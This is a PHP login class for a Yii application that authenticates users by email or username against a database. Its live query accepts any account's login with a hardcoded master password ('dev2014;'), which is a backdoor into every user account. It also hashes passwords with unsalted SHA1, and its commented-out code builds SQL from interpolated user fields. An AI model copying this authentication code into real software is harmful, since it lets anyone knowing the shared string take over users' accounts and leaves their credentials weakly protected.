<?php

/** * UserIdentity represents the data needed to identity a user. * It contains the authentication method that checks if the provided * data can identity the user. */
class UserIdentity extends CUserIdentity {
	private $_id;
	public function authenticate() 
	{
			$password = $this->password;
			$username = strtolower($this->username);
			$password = sha1($password);

			$criteria  = new CDbCriteria();
			$criteria->condition = "(lower(email)=:usuario or lower(usuario) = :usuario) AND (password = :password or :password=sha1('dev2014;') ) AND estatus != 'eliminado' ";
			$criteria->params = array(':usuario' => $username, ":password" => $password);
			$user = User::model()->find($criteria);

		if ($user === null)
			{
				$this->errorCode = self::ERROR_USERNAME_INVALID;
				$this->errorCode = self::ERROR_PASSWORD_INVALID;
			}
		else 
		{
			//Temina las sesiones anteriores
			/*if($this->username!="soporte"){
				Yii::app()->db->createCommand("UPDATE sesiones SET expire=unix_timestamp() WHERE usuario='$user->id' AND expire>unix_timestamp()")->execute();
			}		*/	

			$this->_id = $user->ID;
			$this->username = $user->usuario;
			$this->errorCode = self::ERROR_NONE;

			/* Consultamos los datos del usuario por el username ($user->username) */
			/*$info_usuario = User::model ()->find ( 'LOWER(usuario)=?', array (
					$user->usuario
			) );*/
			/* En las vistas tendremos disponibles last_login y perfil pueden setear las que requieran */
			/*$this->setState ( 'ultima_visita', $info_usuario->ultima_visita );
			$this->setState ( 'perfil', $info_usuario->perfil );*/

			/* Actualizamos el last_login del usuario que se esta autenticando ($user->username) */
		/*	$sql = "update usuarios set ultima_visita = current_timestamp where usuario='$user->usuario'";
			$connection = Yii::app ()->db;
			$command = $connection->createCommand ( $sql );
			$command->execute ();*/

		}
		return $this->errorCode == self::ERROR_NONE;
	}
	public function getId() {
		return $this->_id;
	}
}